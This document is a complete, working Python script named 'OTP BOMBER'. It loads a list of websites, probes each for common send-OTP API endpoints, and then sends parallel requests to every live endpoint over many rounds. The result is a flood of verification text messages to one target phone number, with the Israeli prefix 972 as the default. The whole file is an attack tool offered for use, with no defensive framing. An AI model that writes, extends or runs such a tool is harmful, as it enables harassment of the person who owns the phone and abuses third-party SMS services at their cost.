#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
OTP BOMBER
==========
Enter phone number -> enter rounds -> done.
Every round hits EVERY site in sites.txt, all in parallel.

sites.txt line format:
    domain.com                                  <- tool hunts the endpoint
    domain.com|/api/auth/send-otp               <- exact endpoint
    domain.com|/api/auth/send-otp|phone|json    <- endpoint + field + style

The tool TESTS every line on startup and keeps only the live ones.
"""

import os
import re
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed, TimeoutError as FTimeout

import requests

# ----------------- settings -----------------
WORKERS       = 100     # parallel requests. raise to 200 for more speed
ROUND_SECONDS = 30      # hard cap per round
TIMEOUT       = 12      # per-request timeout
COUNTRY_CODE  = "972"   # country prefix, no plus
USE_PLUS      = False   # True -> send +972..., False -> send 972...
PROBE_LIMIT   = 12      # how many paths to try when the endpoint is unknown

UA = ("Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/124.0 Mobile Safari/537.36")


def app_dir():
    if getattr(sys, "frozen", False):
        return os.path.dirname(sys.executable)
    return os.path.dirname(os.path.abspath(__file__))


HERE = app_dir()
SITES_FILE = os.path.join(HERE, "sites.txt")

# tried only when a site has no endpoint, or its endpoint failed
PROBE_PATHS = [
    "/api/auth/send-otp", "/api/auth/otp", "/api/send-otp", "/api/otp/send",
    "/api/v1/auth/otp", "/api/v1/send-otp", "/api/v1/auth/send-otp",
    "/auth/send-otp", "/auth/otp", "/send-otp", "/otp/send", "/api/send-code",
]


# ----------------- helpers -----------------
def norm_phone(raw):
    p = re.sub(r"[^\d]", "", raw)
    if p.startswith(COUNTRY_CODE):
        intl = p
    elif p.startswith("0"):
        intl = COUNTRY_CODE + p[1:]
    else:
        intl = COUNTRY_CODE + p if len(p) <= 9 else p
    return ("+" + intl) if USE_PLUS else intl


def load_sites():
    sites = []
    with open(SITES_FILE, encoding="utf-8") as f:
        for raw in f:
            line = raw.strip()
            if not line or line.startswith("#"):
                continue
            parts = [x.strip() for x in line.split("|")]
            base = parts[0]
            if not base.startswith("http"):
                base = "https://" + base
            sites.append({
                "base":  base.rstrip("/"),
                "path":  parts[1] if len(parts) > 1 and parts[1] else None,
                "field": parts[2] if len(parts) > 2 and parts[2] else "phone",
                "style": parts[3] if len(parts) > 3 and parts[3] else "json",
            })
    return sites


def fire(base, path, field, phone, style="json"):
    """returns status code, or 0 on network error"""
    url = base + path
    h = {"User-Agent": UA, "Accept": "application/json, text/plain, */*"}
    try:
        if style == "form":
            h["Content-Type"] = "application/x-www-form-urlencoded"
            r = requests.post(url, data={field: phone}, headers=h, timeout=TIMEOUT)
        elif style == "query":
            r = requests.get(url, params={field: phone}, headers=h, timeout=TIMEOUT)
        else:
            h["Content-Type"] = "application/json"
            r = requests.post(url, json={field: phone}, headers=h, timeout=TIMEOUT)
        return r.status_code
    except Exception:
        return 0


def good(code):
    """2xx = sent. 429 = correct endpoint but throttled."""
    return (200 <= code < 300) or code == 429


# ----------------- discovery -----------------
def discover(sites, phone):
    """keep only the endpoints that actually answer."""
    alive, near = [], []
    print(f"\n[*] Testing {len(sites)} sites. This takes a moment...\n")
    start = time.time()

    def check(site):
        tried = []
        if site["path"]:
            tried.append((site["path"], site["field"], site["style"]))
        for p in PROBE_PATHS[:PROBE_LIMIT]:
            if not site["path"] or p != site["path"]:
                tried.append((p, "phone", "json"))
        for path, field, style in tried:
            code = fire(site["base"], path, field, phone, style)
            if good(code):
                return (site["base"], path, field, style, code)
        # remember near-misses (endpoint exists but rejected the payload)
        if tried:
            code = fire(site["base"], tried[0][0], tried[0][1], phone, tried[0][2])
            if 400 <= code < 500 and code != 404:
                return ("NEAR", site["base"], tried[0][0], code)
        return None

    with ThreadPoolExecutor(max_workers=WORKERS) as ex:
        futs = [ex.submit(check, s) for s in sites]
        for i, fut in enumerate(as_completed(futs), 1):
            res = fut.result()
            if not res:
                continue
            if res[0] == "NEAR":
                near.append(res)
                print(f"  ~ {res[1]}{res[2]}   ({res[3]})")
            else:
                base, path, field, style, code = res
                alive.append({"base": base, "path": path,
                              "field": field, "style": style})
                print(f"  + {base}{path}   [{code}]")

    print(f"\n[*] LIVE: {len(alive)} endpoints   |   "
          f"near-miss: {len(near)}   |   {time.time() - start:.0f}s\n")
    return alive


# ----------------- rounds -----------------
def run_round(endpoints, phone, budget):
    sent = ok = fail = 0
    ex = ThreadPoolExecutor(max_workers=WORKERS)
    futs = [ex.submit(fire, e["base"], e["path"], e["field"], phone, e["style"])
            for e in endpoints]
    try:
        for fut in as_completed(futs, timeout=budget):
            sent += 1
            if good(fut.result()):
                ok += 1
            else:
                fail += 1
    except FTimeout:
        pass
    ex.shutdown(wait=False)
    return sent, ok, fail


def main():
    print("=" * 52)
    print("            O T P   B O M B E R")
    print("=" * 52)

    if not os.path.exists(SITES_FILE):
        print(f"\n[X] sites.txt not found next to this program.")
        input("\nPress Enter to exit...")
        return

    sites = load_sites()
    if not sites:
        print("\n[X] sites.txt is empty.")
        input("\nPress Enter to exit...")
        return

    phone_raw = input("\nEnter phone number: ").strip()
    if not phone_raw:
        return
    phone = norm_phone(phone_raw)
    print(f"    -> will send as: {phone}")

    try:
        rounds = int(input("How many rounds: ").strip() or "1")
    except ValueError:
        rounds = 1

    alive = discover(sites, phone)
    if not alive:
        print("[X] Nothing alive. Check your internet or the site list.")
        input("\nPress Enter to exit...")
        return

    print(f"[*] Starting {rounds} rounds. Ctrl+C to stop.\n")
    t0 = time.time()
    total_ok = 0
    try:
        for r in range(1, rounds + 1):
            rs = time.time()
            sent, ok, fail = run_round(alive, phone, ROUND_SECONDS)
            total_ok += ok
            el = time.time() - rs
            print(f"  Round {r}/{rounds}   sent {sent}/{len(alive)}   "
                  f"ok {ok}   fail {fail}   ({el:.1f}s)")
    except KeyboardInterrupt:
        print("\n\n[*] stopped.")

    el = time.time() - t0
    print("\n" + "=" * 52)
    print(f"  rounds      : {rounds}")
    print(f"  total sent  : {total_ok} successful SMS requests")
    print(f"  total time  : {el:.0f}s")
    if el > 0:
        print(f"  speed       : {total_ok / el:.1f} sms/sec")
    print("=" * 52)
    input("\nPress Enter to exit...")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nbye.")
